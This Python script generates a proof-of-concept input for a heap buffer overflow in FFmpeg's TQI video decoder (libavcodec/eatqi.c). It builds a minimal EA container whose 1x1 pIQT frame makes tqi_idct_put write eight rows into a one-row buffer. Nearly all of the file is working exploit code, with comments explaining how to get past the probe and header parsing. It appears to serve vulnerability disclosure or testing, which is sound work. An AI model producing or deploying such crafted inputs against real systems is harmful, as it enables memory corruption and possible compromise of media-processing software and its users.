#!/usr/bin/env python3
"""
PoC generator for VULN-001: Heap Buffer Overflow in tqi_idct_put
(CWE-122) in FFmpeg libavcodec/eatqi.c

Trigger: TQI frame with w=1, h=1 causes ff_get_buffer to allocate
only a 1-row frame, but tqi_idct_put unconditionally writes 8 rows
of luma data via ff_ea_idct_put_c, causing a heap buffer overflow.

Container: EA (Electronic Arts Multimedia) format (.ea)
  - Demuxer: libavformat/electronicarts.c
  - Codec:   libavcodec/eatqi.c (AV_CODEC_ID_TQI, tag pIQT)

File structure:
  1. SCHl block  -- passes ea_probe() and sets up a dummy PCM audio
                    stream so process_ea_header() exits the codec-search
                    loop cleanly after the video block below.
  2. pIQT block  -- sets ea->video.codec = AV_CODEC_ID_TQI (header),
                    then ea_read_packet() delivers its payload as a
                    video packet to tqi_decode_frame().
"""

import struct
import os

# ---------------------------------------------------------------------------
# Build a minimal valid MPEG-1 intra bitstream for 6 blocks
# (4 luma + 2 chroma), all with DC prediction == 0 and no AC.
#
# The TQI decoder byte-swaps the payload with bswap_buf before
# handing it to init_get_bits.  So we build the *desired* post-bswap
# bit-stream and reverse the byte order in each 32-bit word to get
# the bytes that must appear in the file.
#
# Desired post-bswap stream (MSB-first):
#   Block 0 luma  (comp=0): DC VLC 0 = "100" (3 bits), EOB = "10" (2 bits)
#   Block 1 luma  (comp=0): "100" + "10"
#   Block 2 luma  (comp=0): "100" + "10"
#   Block 3 luma  (comp=0): "100" + "10"
#   Block 4 chroma(comp=1): DC VLC 0 = "00"  (2 bits), EOB = "10" (2 bits)
#   Block 5 chroma(comp=2): "00" + "10"
#
# Concatenated (28 bits), padded to 32:
#   10010 10010 10010 10010 0010 0010 0000
#   = 0x94 0xA5 0x22 0x20  (MSB-first byte view)
#
# To get these bytes after bswap32, the file bytes must be their
# byte-reversal within the 32-bit word:
#   file bytes = [0x20, 0x22, 0xA5, 0x94]
# ---------------------------------------------------------------------------

BITSTREAM_FILE_BYTES = bytes([0x20, 0x22, 0xA5, 0x94])

def build_tqi_packet(width=1, height=1, quant=16):
    """
    Build the 12-byte TQI video packet that tqi_decode_frame() expects.

    Layout (from eatqi.c tqi_decode_frame):
      buf[0..1] = width  (LE u16)
      buf[2..3] = height (LE u16)
      buf[4]    = quant  (u8, used by tqi_calculate_qtable)
      buf[5..7] = padding
      buf[8..]  = MPEG-1 intra bitstream (in bswap-encoded form)

    Minimum buf_size check in tqi_decode_frame is 12, so we provide
    exactly 8 header bytes + 4 bitstream bytes = 12 bytes.
    """
    header = struct.pack('<HHBxxx', width, height, quant)  # 8 bytes
    return header + BITSTREAM_FILE_BYTES                   # 12 bytes total


def build_ea_container():
    """
    Build an EA (Electronic Arts Multimedia) container wrapping the
    TQI packet.  The container must pass ea_probe() and have
    process_ea_header() discover both an audio and a video codec so
    the codec-search loop exits without hitting EOF on a third block.

    Block 1: SCHl  -- probe anchor + minimal PCM audio metadata
    Block 2: pIQT  -- TQI video frame payload
    """

    # ------------------------------------------------------------------ #
    # Block 1: SCHl header chunk
    #   process_ea_header case SCHl_TAG reads:
    #     - 4 bytes blockid (we use PT00_TAG = 0x50 0x54 0x00 0x00)
    #     - process_audio_header_elements reads element bytes:
    #         0xFD        -- enter sub-header
    #         0x83        -- element: compression_type
    #         0x01 0x00   -- size=1, value=0  →  PCM S16 LE
    #         0x8A        -- exit sub-header (reads arbitrary size)
    #         0x00        -- size=0 for 0x8A's read_arbitrary
    #         0xFF        -- end of header
    # ------------------------------------------------------------------ #
    PT00_TAG = struct.pack('<4B', 0x50, 0x54, 0x00, 0x00)
    audio_elements = bytes([
        0xFD,               # enter sub-header
        0x83, 0x01, 0x00,   # compression_type = 0 (PCM S16LE)
        0x8A, 0x00,         # exit sub-header
        0xFF,               # end of header
    ])
    schl_payload = PT00_TAG + audio_elements   # 11 bytes
    schl_tag  = b'SCHl'
    schl_size = 8 + len(schl_payload)          # 19
    schl_block = schl_tag + struct.pack('<I', schl_size) + schl_payload

    # ------------------------------------------------------------------ #
    # Block 2: pIQT chunk  (tag 'p','I','Q','T')
    #   process_ea_header case pIQT_TAG sets video.codec = TQI.
    #   ea_read_packet case pIQT_TAG delivers payload as a key video frame.
    # ------------------------------------------------------------------ #
    tqi_payload = build_tqi_packet(width=1, height=1, quant=16)
    piqt_tag  = bytes([0x70, 0x49, 0x51, 0x54])  # 'p','I','Q','T'
    piqt_size = 8 + len(tqi_payload)              # 20
    piqt_block = piqt_tag + struct.pack('<I', piqt_size) + tqi_payload

    return schl_block + piqt_block


def main():
    outfile = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           'vuln_001_input.ea')
    data = build_ea_container()
    with open(outfile, 'wb') as f:
        f.write(data)
    print(f'[+] Written {len(data)} bytes to {outfile}')
    print(f'    SCHl block: 19 bytes  (audio metadata, probe anchor)')
    print(f'    pIQT block: 20 bytes  (TQI frame w=1 h=1 → OOB in tqi_idct_put)')


if __name__ == '__main__':
    main()
